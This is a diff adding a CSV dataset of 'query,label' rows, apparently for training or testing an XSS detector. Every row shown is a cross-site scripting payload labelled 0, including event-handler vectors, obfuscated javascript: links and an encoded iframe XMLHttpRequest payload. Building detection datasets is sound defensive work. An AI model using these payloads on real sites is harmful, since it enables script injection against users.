@@ -1,0 +1,1920 @@
+query,label
+"<area draggable=""true"" ondragend=""alert(1)"">test</area>",0
+"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></code>",0
+"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></option>",0
+"<rt onbeforepaste=""alert(1)"" contenteditable>test</rt>",0
+"<area onmouseenter=""alert(1)"">test</area>",0
+"<shadow oncontextmenu=""alert(1)"">test</shadow>",0
+"<set draggable=""true"" ondragstart=""alert(1)"">test</set>",0
+<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>,0
+"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationstart=""alert(1)""></td>",0
+"<section onmouseleave=""alert(1)"">test</section>",0
+"<style>:target {transform: rotate(180deg);}</style><font id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></font>",0
+"<rtc draggable=""true"" ondrag=""alert(1)"">test</rtc>",0
+"<style>@keyframes x{}</style><dir style=""animation-name:x"" onwebkitanimationend=""alert(1)""></dir>",0
+"<slot onbeforecut=""alert(1)"" contenteditable>test</slot>",0
+"<style>@keyframes slidein {}</style><nav style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nav>",0
+"<style>@keyframes x{}</style><s style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></s>",0
+"<style>@keyframes slidein {}</style><tr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tr>",0
+<source onpointerrawupdate=alert(1)>XSS</source>,0
+<shadow id=x tabindex=1 onfocus=alert(1)></shadow>,0
+"<style>@keyframes x{}</style><image3 style=""animation-name:x"" onanimationstart=""alert(1)""></image3>",0
+"<audio2 onmouseenter=""alert(1)"">test</audio2>",0
+"<body onresize=""alert(1)"">",0
+<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>,0
+<ul onpointerleave=alert(1)>XSS</ul>,0
+<b onafterscriptexecute=alert(1)><script>1</script>,0
+"<video oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" ontransitionstart=alert(1)></nextid>",0
+"<pre draggable=""true"" ondragend=""alert(1)"">test</pre>",0
+<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>,0
+"<abbr draggable=""true"" ondragend=""alert(1)"">test</abbr>",0
+<tbody onmousewheel=alert(1)>requires scrolling,0
+"<slot onmousedown=""alert(1)"">test</slot>",0
+"<rb onkeydown=""alert(1)"" contenteditable>test</rb>",0
+"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></noframes>",0
+"<source ondblclick=""alert(1)"" autofocus tabindex=1>test</source>",0
+"<style>:target {transform: rotate(180deg);}</style><base id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></base>",0
+"<style>:target {color: red;}</style><section id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></section>",0
+"<rb onbeforecut=""alert(1)"" contenteditable>test</rb>",0
+<applet onafterscriptexecute=alert(1)><script>1</script>,0
+<abbr onpointerout=alert(1)>XSS</abbr>,0
+<base onmousewheel=alert(1)>requires scrolling,0
+<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>,0
+"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onanimationend=""alert(1)""></abbr>",0
+"<style>:target {color:red;}</style><video2 id=x style=""transition:color 1s"" ontransitionend=alert(1)></video2>",0
+<source onmousewheel=alert(1)>requires scrolling,0
+"<a onmousedown=""alert(1)"">test</a>",0
+"<rt onkeydown=""alert(1)"" contenteditable>test</rt>",0
+"<rb onmouseleave=""alert(1)"">test</rb>",0
+"<tbody onmouseenter=""alert(1)"">test</tbody>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><map id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></map>",0
+"<a draggable=""true"" ondragenter=""alert(1)"">test</a>",0
+<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,0
+"<set onmouseleave=""alert(1)"">test</set>",0
+<tbody id=x tabindex=1 onfocus=alert(1)></tbody>,0
+<p onmousewheel=alert(1)>requires scrolling,0
+"<style>:target {color:red;}</style><dl id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></dl>",0
+"<style>:target {transform: rotate(180deg);}</style><label id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></label>",0
+"<rb onkeyup=""alert(1)"" contenteditable>test</rb>",0
+"<pre draggable=""true"" ondragenter=""alert(1)"">test</pre>",0
+"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noframes>",0
+<span onpointerdown=alert(1)>XSS</span>,0
+"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",0
+<track id=x tabindex=1 onactivate=alert(1)></track>,0
+<source onpointerdown=alert(1)>XSS</source>,0
+"<slot oncontextmenu=""alert(1)"">test</slot>",0
+"<em draggable=""true"" ondragend=""alert(1)"">test</em>",0
+"<em draggable=""true"" ondragenter=""alert(1)"">test</em>",0
+<address onpointerover=alert(1)>XSS</address>,0
+<rb onmousewheel=alert(1)>requires scrolling,0
+<wbr onpointerout=alert(1)>XSS</wbr>,0
+<section id=x tabindex=1 onbeforedeactivate=alert(1)></section><input autofocus>,0
+"<ul onmouseover=""alert(1)"">test</ul>",0
+"<br onmouseenter=""alert(1)"">test</br>",0
+"<style>:target {transform: rotate(180deg);}</style><nav id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nav>",0
+"<style>:target {color: red;}</style><var id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></var>",0
+"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationend=""alert(1)""></canvas>",0
+"<rb draggable=""true"" ondragstart=""alert(1)"">test</rb>",0
+"<abbr draggable=""true"" ondragenter=""alert(1)"">test</abbr>",0
+<p onpointerout=alert(1)>XSS</p>,0
+<element id=x tabindex=1 onactivate=alert(1)></element>,0
+<s id=x tabindex=1 onfocusin=alert(1)></s>,0
+<tt id=x tabindex=1 onfocus=alert(1)></tt>,0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rb>",0
+"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" ontransitionend=alert(1)></slot>",0
+"<summary onmouseleave=""alert(1)"">test</summary>",0
+"<style>@keyframes slidein {}</style><datalist style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></datalist>",0
+"<rtc onbeforecopy=""alert(1)"" contenteditable>test</rtc>",0
+"<style>@keyframes slidein {}</style><td style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></td>",0
+"<style>@keyframes x{}</style><div style=""animation-name:x"" onanimationstart=""alert(1)""></div>",0
+"<track onmouseover=""alert(1)"">test</track>",0
+"<svg oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+<body onselectionchange=alert(1)>select some text,0
+"<style>:target {color:red;}</style><track id=x style=""transition:color 1s"" ontransitionend=alert(1)></track>",0
+"<element onclick=""alert(1)"">test</element>",0
+"<a onmouseover=""alert(1)"">test</a>",0
+<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>,0
+<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>,0
+"<button draggable=""true"" ondragleave=""alert(1)"">test</button>",0
+<plaintext onbeforescriptexecute=alert(1)><script>1</script>,0
+"<template draggable=""true"" ondragleave=""alert(1)"">test</template>",0
+"<style>@keyframes slidein {}</style><progress style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></progress>",0
+<dialog onpointerup=alert(1)>XSS</dialog>,0
+<section onpointerleave=alert(1)>XSS</section>,0
+"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onanimationstart=""alert(1)""></rtc>",0
+"<strong onmouseenter=""alert(1)"">test</strong>",0
+<dt onpointerrawupdate=alert(1)>XSS</dt>,0
+"<style>@keyframes x{}</style><colgroup style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></colgroup>",0
+"<textarea draggable=""true"" ondragend=""alert(1)"">test</textarea>",0
+"<style>@keyframes slidein {}</style><cite style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></cite>",0
+<a2 onpointerup=alert(1)>XSS</a2>,0
+"<style>:target {color:red;}</style><pre id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></pre>",0
+"<style>@keyframes slidein {}</style><image style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></image>",0
+"<video onmousemove=""alert(1)"">test</video>",0
+"<style>@keyframes slidein {}</style><samp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></samp>",0
+"<rt onbeforecut=""alert(1)"" contenteditable>test</rt>",0
+"<element oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>,0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></video>",0
+"<rtc onbeforepaste=""alert(1)"" contenteditable>test</rtc>",0
+<animate id=x tabindex=1 onactivate=alert(1)></animate>,0
+"<tt draggable=""true"" ondragleave=""alert(1)"">test</tt>",0
+<dialog id=x tabindex=1 onbeforeactivate=alert(1)></dialog>,0
+<select onpointerrawupdate=alert(1)>XSS</select>,0
+"<audio2 oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+"<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>",0
+"<style>@keyframes x{}</style><details style=""animation-name:x"" onwebkitanimationend=""alert(1)""></details>",0
+"<section onkeyup=""alert(1)"" contenteditable>test</section>",0
+<body onafterscriptexecute=alert(1)><script>1</script>,0
+<textarea onbeforepaste=alert(1) autofocus></textarea>,0
+"<style>:target {color:red;}</style><a2 id=x style=""transition:color 1s"" ontransitionend=alert(1)></a2>",0
+"<style>@keyframes x{}</style><a2 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></a2>",0
+"<style>:target {color: red;}</style><bdi id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bdi>",0
+<pre onpointerout=alert(1)>XSS</pre>,0
+"<tt onmouseout=""alert(1)"">test</tt>",0
+"<animatetransform draggable=""true"" ondragend=""alert(1)"">test</animatetransform>",0
+<video2 onmousewheel=alert(1)>requires scrolling,0
+"<rt onmouseleave=""alert(1)"">test</rt>",0
+"<output onmouseup=""alert(1)"">test</output>",0
+<base onpointerout=alert(1)>XSS</base>,0
+"<tr onpaste=""alert(1)"" contenteditable>test</tr>",0
+"<script draggable=""true"" ondragenter=""alert(1)"">test</script>",0
+"<select onmouseup=""alert(1)"">test</select>",0
+<th onpointerleave=alert(1)>XSS</th>,0
+"<section draggable=""true"" ondragenter=""alert(1)"">test</section>",0
+"<style>:target {color: red;}</style><param id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></param>",0
+"<blink onbeforecut=""alert(1)"" contenteditable>test</blink>",0
+"<ruby onbeforecut=""alert(1)"" contenteditable>test</ruby>",0
+<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>,0
+"<style>:target {color: red;}</style><colgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></colgroup>",0
+"<style>@keyframes slidein {}</style><input3 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></input3>",0
+"<style>:target {color: red;}</style><head id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></head>",0
+"<plaintext oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>,0
+<source onpointerout=alert(1)>XSS</source>,0
+"<article ondblclick=""alert(1)"" autofocus tabindex=1>test</article>",0
+<animatetransform onpointerleave=alert(1)>XSS</animatetransform>,0
+<select onpointerleave=alert(1)>XSS</select>,0
+<tt id=x tabindex=1 onbeforedeactivate=alert(1)></tt><input autofocus>,0
+"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",0
+<video controls src=1 onfocus=alert(1) autofocus>,0
+"<output ondblclick=""alert(1)"" autofocus tabindex=1>test</output>",0
+"<style>@keyframes x{}</style><progress style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></progress>",0
+"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationend=""alert(1)""></template>",0
+"<style>:target {color:red;}</style><applet id=x style=""transition:color 1s"" ontransitionstart=alert(1)></applet>",0
+"<wbr onkeypress=""alert(1)"" contenteditable>test</wbr>",0
+"<style>:target {color: red;}</style><strong id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strong>",0
+<progress onpointermove=alert(1)>XSS</progress>,0
+"<style>:target {color: red;}</style><animatemotion id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></animatemotion>",0
+"<style>:target {color:red;}</style><dialog id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></dialog>",0
+"<template onkeydown=""alert(1)"" contenteditable>test</template>",0
+"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationstart=""alert(1)""></template>",0
+<body onafterprint=alert(1)>,0
+"<article onpaste=""alert(1)"" contenteditable>test</article>",0
+"<p draggable=""true"" ondragenter=""alert(1)"">test</p>",0
+"<style>@keyframes x{}</style><dir style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></dir>",0
+<small id=x tabindex=1 onactivate=alert(1)></small>,0
+<video onpointerover=alert(1)>XSS</video>,0
+"<blockquote draggable=""true"" ondragenter=""alert(1)"">test</blockquote>",0
+"<rp draggable=""true"" ondragenter=""alert(1)"">test</rp>",0
+"<style>:target {color:red;}</style><br id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></br>",0
+"<video oncanplaythrough=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",0
+"<applet draggable=""true"" ondrag=""alert(1)"">test</applet>",0
+"<style>:target {color:red;}</style><frame id=x style=""transition:color 1s"" ontransitionend=alert(1)></frame>",0
+"<b onpaste=""alert(1)"" contenteditable>test</b>",0
+<u onafterscriptexecute=alert(1)><script>1</script>,0
+"<pre onmousedown=""alert(1)"">test</pre>",0
+"<style>@keyframes slidein {}</style><tbody style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></tbody>",0
+<small onpointerout=alert(1)>XSS</small>,0
+<track onpointermove=alert(1)>XSS</track>,0
+"<tfoot ondblclick=""alert(1)"" autofocus tabindex=1>test</tfoot>",0
+"<dt onkeypress=""alert(1)"" contenteditable>test</dt>",0
+<u id=x tabindex=1 onfocus=alert(1)></u>,0
+"<param onmouseenter=""alert(1)"">test</param>",0
+<abbr onpointerenter=alert(1)>XSS</abbr>,0
+<strong onpointerdown=alert(1)>XSS</strong>,0
+"<style>@keyframes x{}</style><th style=""animation-name:x"" onwebkitanimationend=""alert(1)""></th>",0
+<table onpointermove=alert(1)>XSS</table>,0
+"<address onpaste=""alert(1)"" contenteditable>test</address>",0
+"<video onkeyup=""alert(1)"" contenteditable>test</video>",0
+"<tfoot draggable=""true"" ondragstart=""alert(1)"">test</tfoot>",0
+<ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>,0
+<button onpointermove=alert(1)>XSS</button>,0
+<q onpointerout=alert(1)>XSS</q>,0
+<rt onmousewheel=alert(1)>requires scrolling,0
+"<style>:target {transform: rotate(180deg);}</style><tr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tr>",0
+"<style>:target {color:red;}</style><command id=x style=""transition:color 1s"" ontransitionend=alert(1)></command>",0
+<section onpointerrawupdate=alert(1)>XSS</section>,0
+"<source draggable=""true"" ondragend=""alert(1)"">test</source>",0
+"<style>@keyframes slidein {}</style><iframe style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></iframe>",0
+"<th draggable=""true"" ondragend=""alert(1)"">test</th>",0
+"<style>@keyframes x{}</style><ins style=""animation-name:x"" onanimationend=""alert(1)""></ins>",0
+"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></fieldset>",0
+"<br ondblclick=""alert(1)"" autofocus tabindex=1>test</br>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><abbr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></abbr>",0
+"<style>:target {color:red;}</style><progress id=x style=""transition:color 1s"" ontransitionend=alert(1)></progress>",0
+<th id=x tabindex=1 onfocus=alert(1)></th>,0
+"<style>:target {transform: rotate(180deg);}</style><iframe id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></iframe>",0
+"<style>@keyframes slidein {}</style><img style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></img>",0
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,0
+<time onmousewheel=alert(1)>requires scrolling,0
+<tbody onpointerdown=alert(1)>XSS</tbody>,0
+<source onpointerup=alert(1)>XSS</source>,0
+"<style>:target {color:red;}</style><frame id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></frame>",0
+"<s onmouseleave=""alert(1)"">test</s>",0
+<rb id=x tabindex=1 onfocusin=alert(1)></rb>,0
+"<style>@keyframes x{}</style><animatemotion style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></animatemotion>",0
+<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>,0
+<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>,0
+<span id=x tabindex=1 onfocusin=alert(1)></span>,0
+<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>,0
+"<style>:target {color:red;}</style><img id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></img>",0
+"<u onkeydown=""alert(1)"" contenteditable>test</u>",0
+<style onmousewheel=alert(1)>requires scrolling,0
+"<style>:target {color:red;}</style><dd id=x style=""transition:color 1s"" ontransitionend=alert(1)></dd>",0
+"<rt draggable=""true"" ondragleave=""alert(1)"">test</rt>",0
+"<style>@keyframes slidein {}</style><bdi style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></bdi>",0
+"<style>:target {color:red;}</style><area id=x style=""transition:color 1s"" ontransitionstart=alert(1)></area>",0
+"<set onmousedown=""alert(1)"">test</set>",0
+<template onpointerover=alert(1)>XSS</template>,0
+"<style>@keyframes x{}</style><video2 style=""animation-name:x"" onanimationend=""alert(1)""></video2>",0
+"<style>@keyframes x{}</style><ul style=""animation-name:x"" onwebkitanimationend=""alert(1)""></ul>",0
+"<style>@keyframes x{}</style><dir style=""animation-name:x"" onanimationstart=""alert(1)""></dir>",0
+"<script draggable=""true"" ondragleave=""alert(1)"">test</script>",0
+"<samp onbeforecopy=""alert(1)"" contenteditable>test</samp>",0
+<script onload=alert(1) src=validjs.js></script>,0
+<dir onpointerover=alert(1)>XSS</dir>,0
+"<style>@keyframes slidein {}</style><link style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></link>",0
+"<style>@keyframes slidein {}</style><button style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></button>",0
+<animatetransform onpointerup=alert(1)>XSS</animatetransform>,0
+"<title onbeforepaste=""alert(1)"" contenteditable>test</title>",0
+"<style>:target {color:red;}</style><b id=x style=""transition:color 1s"" ontransitionstart=alert(1)></b>",0
+"<style>@keyframes x{}</style><map style=""animation-name:x"" onanimationend=""alert(1)""></map>",0
+"<small onclick=""alert(1)"">test</small>",0
+"<a2 oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",0
+"<abbr oncontextmenu=""alert(1)"">test</abbr>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><kbd id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></kbd>",0
+<picture onpointerout=alert(1)>XSS</picture>,0
+"<style>:target {color:red;}</style><frame id=x style=""transition:color 1s"" ontransitionstart=alert(1)></frame>",0
+<plaintext onpointerleave=alert(1)>XSS</plaintext>,0
+"<style>:target {transform: rotate(180deg);}</style><hr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hr>",0
+"<style>@keyframes x{}</style><image3 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></image3>",0
+"<style>:target {transform: rotate(180deg);}</style><dfn id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dfn>",0
+<spacer onpointermove=alert(1)>XSS</spacer>,0
+"<style>:target {color:red;}</style><basefont id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></basefont>",0
+"<style>:target {transform: rotate(180deg);}</style><summary id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></summary>",0
+"<style>:target {color: red;}</style><applet id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></applet>",0
+"<th ondblclick=""alert(1)"" autofocus tabindex=1>test</th>",0
+"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationend=""alert(1)""></ruby>",0
+"<pre onmouseout=""alert(1)"">test</pre>",0
+"<style>:target {color:red;}</style><code id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></code>",0
+<slot id=x tabindex=1 onfocusin=alert(1)></slot>,0
+<body onpointerrawupdate=alert(1)>XSS</body>,0
+"<style>@keyframes x{}</style><param style=""animation-name:x"" onanimationend=""alert(1)""></param>",0
+<animatetransform id=x tabindex=1 onbeforeactivate=alert(1)></animatetransform>,0
+"<section onmousedown=""alert(1)"">test</section>",0
+"<plaintext draggable=""true"" ondragleave=""alert(1)"">test</plaintext>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><optgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></optgroup>",0
+<dir onpointerup=alert(1)>XSS</dir>,0
+"<thead onkeypress=""alert(1)"" contenteditable>test</thead>",0
+<strike onpointermove=alert(1)>XSS</strike>,0
+"<style>:target {color: red;}</style><img2 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></img2>",0
+<section id=x tabindex=1 onbeforeactivate=alert(1)></section>,0
+<svg onpointerout=alert(1)>XSS</svg>,0
+"<style>:target {color:red;}</style><option id=x style=""transition:color 1s"" ontransitionstart=alert(1)></option>",0
+<sub id=x tabindex=1 onactivate=alert(1)></sub>,0
+"<q onkeypress=""alert(1)"" contenteditable>test</q>",0
+"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></pre>",0
+"<sub ondblclick=""alert(1)"" autofocus tabindex=1>test</sub>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><source id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></source>",0
+"<style>@keyframes slidein {}</style><acronym style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></acronym>",0
+"<u onkeyup=""alert(1)"" contenteditable>test</u>",0
+<slot id=x tabindex=1 onactivate=alert(1)></slot>,0
+"<strong onkeydown=""alert(1)"" contenteditable>test</strong>",0
+<%<!--'%><script>alert(1);</script -->,0
+"<br onmouseup=""alert(1)"">test</br>",0
+<b onpointerout=alert(1)>XSS</b>,0
+"<caption onbeforecut=""alert(1)"" contenteditable>test</caption>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></iframe>",0
+"<style>:target {transform: rotate(180deg);}</style><nobr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nobr>",0
+<blink id=x tabindex=1 onfocusin=alert(1)></blink>,0
+"<style>:target {color:red;}</style><img id=x style=""transition:color 1s"" ontransitionstart=alert(1)></img>",0
+"<style>@keyframes x{}</style><em style=""animation-name:x"" onwebkitanimationend=""alert(1)""></em>",0
+"<span oncontextmenu=""alert(1)"">test</span>",0
+<rp id=x tabindex=1 onactivate=alert(1)></rp>,0
+"<ul onmousedown=""alert(1)"">test</ul>",0
+"<spacer onkeyup=""alert(1)"" contenteditable>test</spacer>",0
+<style id=x tabindex=1 onactivate=alert(1)></style>,0
+<title onblur=alert(1) tabindex=1 id=x></title><input autofocus>,0
+"<tr draggable=""true"" ondragleave=""alert(1)"">test</tr>",0
+"<style>:target {color:red;}</style><optgroup id=x style=""transition:color 1s"" ontransitionstart=alert(1)></optgroup>",0
+<tbody id=x tabindex=1 onactivate=alert(1)></tbody>,0
+"<tbody oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
+"<style>@keyframes x{}</style><video style=""animation-name:x"" onwebkitanimationend=""alert(1)""></video>",0
+"<style>:target {color:red;}</style><details id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></details>",0
+"<style>:target {transform: rotate(180deg);}</style><ul id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></ul>",0
+<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>,0
+"<source oncontextmenu=""alert(1)"">test</source>",0
+"<style>@keyframes slidein {}</style><q style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></q>",0
+"<style>@keyframes x{}</style><img style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></img>",0
+"<samp onmousedown=""alert(1)"">test</samp>",0
+<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>,0
+<textarea onbeforecopy=alert(1) autofocus>XSS</textarea>,0
+"<sup onmousedown=""alert(1)"">test</sup>",0
+<style onblur=alert(1) tabindex=1 id=x></style><input autofocus>,0
+"<acronym oncontextmenu=""alert(1)"">test</acronym>",0
+"<select draggable=""true"" ondragenter=""alert(1)"">test</select>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><label id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></label>",0
+"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationend=""alert(1)""></isindex>",0
+"<style>:target {color:red;}</style><samp id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></samp>",0
+"<plaintext onbeforecut=""alert(1)"" contenteditable>test</plaintext>",0
+<style onpointerover=alert(1)>XSS</style>,0
+<body/onload=&lt;!--&gt;&#10alert(1)>,0
+"<style>@keyframes x{}</style><output style=""animation-name:x"" onwebkitanimationend=""alert(1)""></output>",0
+"<abbr onmouseleave=""alert(1)"">test</abbr>",0
+"<a draggable=""true"" ondragleave=""alert(1)"">test</a>",0
+"<style>:target {color: red;}</style><audio2 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></audio2>",0
+"<style>:target {color:red;}</style><image2 id=x style=""transition:color 1s"" ontransitionstart=alert(1)></image2>",0
+"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationstart=""alert(1)""></input>",0
+"<a2 draggable=""true"" ondrag=""alert(1)"">test</a2>",0
+"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></option>",0
+"<style>:target {color:red;}</style><xmp id=x style=""transition:color 1s"" ontransitionend=alert(1)></xmp>",0
+<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>,0
+"<sub onmousemove=""alert(1)"">test</sub>",0
+<base onpointerover=alert(1)>XSS</base>,0
+<output onafterscriptexecute=alert(1)><script>1</script>,0
+"<script onmousemove=""alert(1)"">test</script>",0
+"<style>@keyframes x{}</style><p style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></p>",0
+"<td onmousemove=""alert(1)"">test</td>",0
+<img src=`xx:xx`onerror=alert(1)>,0
+"<style onmouseup=""alert(1)"">test</style>",0
+"<rt onpaste=""alert(1)"" contenteditable>test</rt>",0
+"<style>@keyframes slidein {}</style><sup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></sup>",0
+"<style>:target {transform: rotate(180deg);}</style><header id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></header>",0
+<audio2 onpointermove=alert(1)>XSS</audio2>,0
+"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationstart=""alert(1)""></dd>",0
+"<applet onpaste=""alert(1)"" contenteditable>test</applet>",0
+"<video2 onmouseup=""alert(1)"">test</video2>",0
+"<table onbeforepaste=""alert(1)"" contenteditable>test</table>",0
